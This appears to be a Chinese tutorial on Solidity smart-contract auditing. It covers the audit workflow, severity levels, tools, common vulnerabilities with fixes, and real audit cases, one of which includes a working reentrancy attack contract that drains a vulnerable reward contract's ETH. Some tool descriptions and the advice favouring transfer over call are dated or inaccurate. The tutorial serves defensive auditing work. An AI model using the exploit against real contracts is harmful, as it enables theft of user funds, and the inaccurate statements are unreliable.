# 揭开 Solidity 合约审计的秘密

## 一. 概述

Solidity 合约审计是确保智能合约代码安全、健壮并符合预期的关键过程。由于智能合约更改升级麻烦，或者有的合约不支持升级修改且直接控制着资金，审计对保障去中心化项目的安全尤为重要。小到 NFT 项目，大到公链项目，无一是不经过审计就上线主网的。

在 Web3 行业，有众多提供审计服务的公司和团队，它们的审计能力和专业水平各不相同。此外，也有专注于开发辅助审计工具的公司，帮助提升审计效率和效果。不同的审计团队在技术深度、审计流程和经验上存在差异，导致其提供的审计质量参差不齐。

## 二. 审计流程

智能合约的审计流程通常是一个系统化的步骤，旨在确保代码的安全性、正确性和性能。以下是典型的 Solidity 智能合约审计流程：

### 1. 需求分析和范围确定

- **初步讨论**：与客户沟通，了解项目的目标、智能合约的功能和业务逻辑。
- **范围确定**：明确需要审计的智能合约文件、涉及的协议部分，以及审计的深度（全面审计或部分功能审计）。

### 2. 代码审查

- **代码获取**：审计团队会从客户提供的代码仓库或合约地址获取合约代码。
- **理解业务逻辑**：详细阅读智能合约，了解其功能、设计模式以及核心业务逻辑，以便发现可能的风险点。

### 3. 静态分析

- **使用自动化工具**：通过静态分析工具（如 MythX、Slither、Oyente 等）扫描代码，检测常见的安全漏洞，如重入攻击、整数溢出、权限管理等。
- **识别常见问题**：分析工具生成的报告，初步发现智能合约中的潜在安全问题。

### 4. 手动审计

- **深入手动审查**：审计员手动检查代码，查找逻辑错误、复杂漏洞或自动化工具无法捕获的问题，如业务逻辑漏洞、经济攻击风险、权限管理漏洞等。
- **分析边界条件**：审计团队会重点分析边界条件和极端场景下的代码行为，以确保代码能在各种情况下正常工作。

### 5. 测试与模拟攻击

- **编写测试用例**：根据智能合约的功能和审计中发现的潜在问题，编写测试用例，验证代码是否按预期执行。
- **模拟攻击场景**：创建恶意合约或设置模拟攻击环境，测试智能合约在遭受重入攻击、DoS 攻击、经济攻击等场景下的表现。
- **评估 Gas 效率**：在执行过程中，评估代码的 Gas 成本，寻找可以优化的地方。

### 6. 风险评估与修复建议

- **评估问题的严重性**：对每个发现的问题进行风险评估，按严重程度（如 Critical、High、Medium、Low）分类。
- **提出修复建议**：针对每个问题，提供具体的修复建议，帮助开发团队优化代码并提高安全性。

### 7. 审计报告撰写

- **问题列表**：列出发现的问题及其严重性，并附上详细的技术分析和修复建议。
- **代码优化建议**：除了漏洞修复，报告还会提出代码结构优化、Gas 优化等建议。
- **合规性评估**：评估合约与标准（如 ERC20、ERC721 等）的合规性，确保合约符合规范要求。

### 8. 客户修复与二次审计

- **修复问题**：客户根据审计报告修复代码中的漏洞和问题。
- **二次审计**：修复完成后，审计团队会重新审核代码，确保所有问题得到解决，并确认修复未引入新漏洞。

### 9. 最终报告发布

- **完整的审计报告**：包含所有的审计发现、修复建议和最终验证结果。通常分为内部报告和公开报告（如项目白皮书附录中的安全审计章节）。
- **公开声明**：许多审计公司会为项目发布正式的审计声明，表明该项目已通过安全审核。

### 10. 持续监控和支持（可选）

- **后续支持**：审计公司可以提供上线后的监控和安全支持，及时发现和应对可能出现的新风险。
- **智能合约升级审计**：当合约需要升级或新增功能时，审计团队可以为其提供进一步的审计服务。

通过这些步骤，智能合约的审计过程可以有效地保障项目的安全性、合规性和性能。

## 三. 审计 Bug 级别

- **A (Critical)**: 这类 Bug 对合约的功能或数据安全性产生了致命影响，可能会导致系统瘫痪或大额资金丢失，需要立即修复。
- **B (High)**: 这类 Bug 会对核心功能造成严重影响，可能导致一些功能不能正常使用或数据不准确。虽不及 "关键" 等级严重，但仍需尽快解决。
- **C (Medium)**: 这类 Bug 可能会对某些非核心功能造成影响，可能导致用户使用上的困扰或体验不佳，但不会影响到关键数据和大致的功能运行。
- **D (Low)**: 这类 Bug 对功能和数据的影响较小或难以注意到，可能只是一些细节上的问题，包括诸如拼写错误、语法错误或使用上的小困扰等。
- **E (Information)**: 这些不是 Bug，而是关于代码改进的建议或关于潜在问题的提醒。通常不会影响合约的安全性或功能，但能够帮助开发团队优化代码质量或提高可读性。

开放审计中 A、B、C 和 D 一般都会给奖励，E 类的有的审计公司会给，有的不会给。

## 四. 审计公司

![](solidity_audit/image.png)

## 五. 常用的审计工具

- **Mythril**: Mythril 是一款基于 Python 的开源工具，主要用于发现智能合约中可能存在的漏洞。
- **Oyente**: Oyente 是一款基于 Python 的开源工具，用于检查智能合约中可能存在的漏洞。
- **Securify**: Securify 是一种基于静态分析的工具，用于检查以太坊智能合约中的漏洞和缺陷。
- **SmartCheck**: SmartCheck 是一款智能合约静态分析和漏洞检测工具，旨在提高智能合约的安全性和可靠性。
- **Slither**: Slither 是一款开源工具，可帮助开发人员和审计人员检测和解决智能合约中的漏洞。
- **Manticore**: Manticore 是一种动态二进制分析工具，可用于分析以太坊智能合约中的漏洞和安全性。
- **Echidna**: Echidna 是一种基于符号执行的工具，可用于检查以太坊智能合约中的漏洞和安全性。
- **Teether**: Teether 是一个基于二进制分析的工具，用于检查以太坊智能合约的漏洞和缺陷。

## 六. 常见漏洞分析

智能合约的安全性至关重要，因为一旦部署到区块链上，合约的行为就不可更改。智能合约中的漏洞可能导致资金损失、业务逻辑崩溃，甚至项目的失败。以下是常见的智能合约漏洞及其详细分析：

### 1. 重入攻击（Reentrancy Attack）

- **概述**：重入攻击是智能合约中最经典的漏洞之一，攻击者通过递归调用目标合约的外部函数，在该合约完成状态更新之前反复提取资金。
- **示例**：攻击者通过调用外部合约中的 `withdraw` 函数，可以在目标合约的状态尚未更新前多次提取资金。
- **防范措施**：在执行外部调用之前先更新合约状态，或者使用 OpenZeppelin 的 `ReentrancyGuard` 来防止重入调用。

```solidity
// 解决方案：先更新状态再执行转账
function withdraw(uint _amount) external nonReentrant {
    require(balances[msg.sender] >= _amount, "Insufficient balance");
    balances[msg.sender] -= _amount;
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Transfer failed.");
}
```

### 2. 整数溢出与下溢（Integer Overflow and Underflow）

- **概述**：智能合约中的整数溢出或下溢可能导致数值计算错误，从而引发资金损失或逻辑异常。早期版本的 Solidity 没有自动检测这些问题。
- **示例**：如果一个变量 `uint8` 类型的值超过 `255`，就会发生溢出，值重新从 `0` 开始。
- **防范措施**：自 Solidity 0.8.0 版本开始，编译器会自动检查溢出/下溢。如果使用早期版本，可以使用 OpenZeppelin 的 `SafeMath` 库来防止此类问题。

```solidity
uint256 public balance;

function add(uint256 value) public {
    require(balance + value >= balance, "Overflow detected");
    balance += value;
}
```

### 3. 不安全的外部调用（Untrusted External Calls）

- **概述**：智能合约中的外部调用，特别是通过 `call` 方法，可能会在不受信任的合约中引发恶意行为，如 DoS 攻击、重入攻击等。
- **示例**：`call` 方法的使用不当可能导致调用失败，或对攻击者合约进行未预期的调用。
- **防范措施**：避免使用低级 `call`，在使用 `call` 时应限制执行的最大 Gas，或者在调用后检查返回值。此外，使用 `transfer` 和 `send` 方法也更为安全。

```solidity
// 不建议的代码
(bool success, ) = recipient.call{value: amount}("");
require(success, "External call failed");

// 改进：使用 send 或 transfer 以限制 Gas 使用
recipient.transfer(amount);
```

### 4. 权限管理缺陷（Access Control Vulnerabilities）

- **概述**：智能合约中权限控制不当可能导致敏感操作被任意用户执行，进而破坏合约的安全性。
- **示例**：未正确限制某些敏感功能（如合约销毁、资金提取）可能导致攻击者滥用权限。
- **防范措施**：使用 OpenZeppelin 的 `Ownable` 或 `AccessControl` 库来限制特权功能的调用，确保只有指定用户或角色能够执行敏感操作。

```solidity
import "@openzeppelin/contracts/access/Ownable.sol";

contract MyContract is Ownable {
    function withdraw() public onlyOwner {
        // 仅允许合约所有者提取资金
        payable(owner()).transfer(address(this).balance);
    }
}
```

### 5. 回退函数滥用（Fallback Function Misuse）

- **概述**：回退函数（`fallback` 或 `receive`）在没有定义具体函数时被调用。攻击者可以利用回退函数进行以太币的意外转移，或者通过强制发送以太币触发异常行为。
- **示例**：如果回退函数没有限制，攻击者可能通过发送大量以太币来触发意想不到的行为。
- **防范措施**：限制回退函数的逻辑，不要在回退函数中执行复杂操作，且应设置 Gas 限制。

```solidity
// 不建议的代码
fallback() external payable {
    // 可能导致复杂的执行逻辑
}

// 改进：回退函数仅限于接受以太币
receive() external payable {
    // 空函数体，纯粹用于接收以太币
}
```

### 6. 随机数生成不安全（Insecure Randomness）

- **概述**：在智能合约中生成随机数通常是困难的，因为区块链上的所有信息都是公开的，矿工或攻击者可以预测或操控随机数生成。
- **示例**：使用 `block.timestamp` 或 `blockhash` 生成随机数，可能被矿工或攻击者操纵。
- **防范措施**：避免使用可预测的链上数据生成随机数，可以借助 Chainlink VRF 等链外随机数生成服务。

```solidity
// 不安全的随机数生成
uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));

// 改进：使用 Chainlink VRF 等外部服务
```

### 7. Denial of Service (DoS) 攻击

- **概述**：攻击者通过阻止合约执行某些关键操作，导致其他用户无法正常使用合约，典型场景包括拒绝服务（DoS）攻击。
- **示例**：攻击者通过消耗合约内所有 Gas，或者利用复杂数据结构（如数组）导致循环操作超时。
- **防范措施**：避免依赖循环结构处理大量用户请求，确保单个操作的 Gas 成本在可控范围内。

```solidity
// 避免使用无限大的循环
for (uint i = 0; i < largeArray.length; i++) {
    // 循环逻辑
}
```

### 8. 交易顺序依赖性（Transaction-Ordering Dependence）

- **概述**：如果智能合约中的某些操作依赖于交易的顺序，矿工可以通过重新排列交易顺序来获得不公平的优势。
- **示例**：矿工可以在某个高价值交易之前插入自己的交易，从而获得经济利益。
- **防范措施**：避免设计依赖交易顺序的逻辑，或者通过使用时间锁等方式减少这种依赖。

### 9. 时间依赖性（Timestamp Dependence）

- **概述**：依赖区块时间戳的合约可能受到操控，因为矿工可以对区块时间戳进行一定的调整。
- **示例**：如果合约逻辑中存在基于 `block.timestamp` 的时间约束，矿工可能会调整时间戳以获利。
- **防范措施**：尽量避免直接依赖时间戳，或将其作为附加条件而非核心条件。

## 七. 审计中实际案例分析

- https://github.com/Secure3Audit
- https://github.com/solid-rock-security/solid-rock-audit
- https://github.com/Layr-Labs/eigenlayer-contracts/tree/dev/audits
- https://github.com/Uniswap/v3-core/blob/main/audits/tob/audit.pdf

其他项目的审计报告也可以在其项目的 GitHub 下面找到，大家有兴趣的话可以自行去找找。

## 八. 实际审计中的几个问题分析

### 1. 实际案例一：重入漏洞

#### 存储在问题的代码

```solidity
function claimToken() {
    uint256 rewardAmount = userRewardAmounts[msg.sender][tokenAddress];
    require(
        rewardAmount > 0,
        "TreasureManager claimToken: no reward available"
    );
    if (tokenAddress == ethAddress) {
        (bool success, ) = msg.sender.call{value: rewardAmount}("");
        require(success, "TreasureManager claimToken: ETH transfer failed");
    } else {
        IERC20(tokenAddress).safeTransfer(msg.sender, rewardAmount);
    }
    userRewardAmounts[msg.sender][tokenAddress] = 0;
    tokenBalances[tokenAddress] -= rewardAmount;
}
```

#### 漏洞详细信息

- **概括**：`claimToken` 和 `claimAllTokens` 函数由于违反了检查-效果-交互（CEI）模式，容易受到重入攻击。合约在转账后更新用户的奖励余额，从而允许恶意合约在余额更新之前重新进入该函数。
- **影响**：此漏洞可能导致协议遭受严重财务损失。攻击者可能利用此重入漏洞耗尽合约中存储的所有 ETH。影响范围如下：
  - **财务损失**：合约的全部 ETH 余额可能被盗，从而给协议及其用户造成重大的经济损失。
  - **不变量被破坏**：合约的状态可能与实际代币余额不一致。
  - **信任侵蚀**：这种攻击会严重损害协议的声誉，可能会导致用户信任和采用的丧失。
  - **运营中断**：攻击可能会破坏奖励分配系统的正常运行，影响平台的所有用户。
  - **连锁效应**：如果被盗资金用于其他业务或代表用户存款，其影响可能不仅限于直接的财务损失，还可能影响该协议的更广泛的生态系统。
  - **恢复成本**：处理此类攻击的后果将耗费大量的时间、资源，并且可能给受影响的用户带来损失。

由于该漏洞易于利用且可能造成资金完全耗尽，因此其严重性更加突出，因此它是一个需要立即关注和补救的高优先级安全问题。

#### 攻击 POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/TreasureManager.sol";

contract AttackTreasureManager {
    TreasureManager public treasureManager;
    address payable public owner;
    uint256 public attackAmount;

    constructor(address _treasureManager) {
        treasureManager = TreasureManager(payable(_treasureManager));
        owner = payable(msg.sender);
    }

    function attackClaimToken(address tokenAddress) external {
        attackAmount = 0;
        treasureManager.claimToken(tokenAddress);
    }

    receive() external payable {
        reentrance();
    }

    fallback() external payable {
        reentrance();
    }

    function reentrance() internal {
        address ethAddress = treasureManager.ethAddress();
        uint left = treasureManager.userRewardAmounts(
            address(this),
            ethAddress
        );
        attackAmount += left;
        if (treasureManager.tokenBalances(ethAddress) > attackAmount + left) {
            treasureManager.claimToken(ethAddress);
        }
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
```

#### 解决办法

- 把转账放到最后
- 用 OpenZeppelin 的防止重入

### 2. 实际案例二：0 地址问题

```solidity
function updateSequencerAddress(address _sequencer) external {
    require(msg.sender == sequencer, "Only the sequencer can update sequencer address");
    sequencer = _sequencer;
}
```

#### 改进方式

```solidity
require(_sequencer != address(0), "Invalid address");
```

### 3. 实际案例三：严重 Logic 错误

```solidity
function resetRollupBatchData(uint256 _rollupBatchIndex) external {
    require(msg.sender == sequencer, "Only the sequencer can reset batch rollup batch data");
    for (uint256 i = 0; i < rollupBatchIndex; i++) {
        delete rollupBatchIndexRollupStores[i];
    }
    rollupBatchIndex = _rollupBatchIndex;
    l2StoredBlockNumber = 1;
    l2ConfirmedBlockNumber = 1;
}
```

#### 怎么改

- 分阶段删除，改进如下：

```solidity
function resetRollupBatchData(uint256 startBatchIndex, uint256 endBatchIndex) external {
    require(msg.sender == sequencer, "Only the sequencer can reset batch rollup batch data");
    for (uint256 i = startBatchIndex; i < endBatchIndex; i++) {
        delete rollupBatchIndexRollupStores[i];
    }
    rollupBatchIndex = endBatchIndex;
    l2StoredBlockNumber = 1;
    l2ConfirmedBlockNumber = 1;
}
```

### 4. 实际案例四：Slot 对齐问题

- 在代码理解解释完成

### 5. 实际案例五：精度问题

- Shares：不做最小值的处理的话，第一笔质押很小的话会出现精度导致计算逻辑错误
- Uniswap 里面的最小值的限定也类似
- 先乘后除

## 九. 总结

智能合约中的漏洞可能会带来严重的安全和财务风险。通过遵循安全最佳实践、使用自动化审计工具、进行手动审查以及采用外部安全服务，开发者可以大大降低这些漏洞的发生概率，保障合约的安全性。
